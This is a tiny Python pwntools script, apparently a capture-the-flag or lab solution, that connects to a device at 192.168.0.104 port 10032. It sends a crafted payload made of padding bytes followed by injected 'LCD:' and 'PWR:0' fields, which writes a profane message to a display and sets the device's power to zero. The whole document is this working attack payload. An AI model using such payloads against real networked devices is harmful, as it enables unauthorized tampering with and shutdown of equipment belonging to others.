 
from pwn import *

h = '192.168.0.104'
p = 10032
con = remote(h, p)
payload = 'A' * 8 + "LCD:FUCK-YOU-SLEEP-BITCH" + '0' * 6 + "PWR:0"
con.sendline(payload)
con.close()
